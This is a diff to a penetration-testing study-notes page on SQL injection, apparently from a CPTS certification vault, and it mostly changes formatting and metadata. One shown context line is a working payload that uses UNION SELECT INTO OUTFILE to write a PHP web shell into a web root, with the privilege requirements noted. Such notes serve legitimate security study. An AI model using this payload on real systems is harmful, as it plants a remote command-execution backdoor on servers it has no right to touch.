@@ -1,6 +1,11 @@
 ---
 title: "SQL Injection"
+description: "CPTS study notes, workflows, and references from the vault."
 ---
+
+{/* Generated from Web/SQL Injection.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Injection into a SQL query. Confirm with a boolean/error probe, find the column count, then extract data.
 
@@ -30,8 +35,8 @@ Injection into a SQL query. Confirm with a boolean/error probe, find the column 
 ' UNION SELECT 1,'<?php system($_GET[0]);?>',3,4 INTO OUTFILE '/var/www/html/sh.php'-- -
 ```
 
-<Warning>
-Requires `FILE` privilege and a known, writable web root. `secure_file_priv` must permit it.
-</Warning>
+
+> Requires `FILE` privilege and a known, writable web root. `secure_file_priv` must permit it.
+
 
 See [SQLmap](/web/sqlmap) to automate detection and extraction.
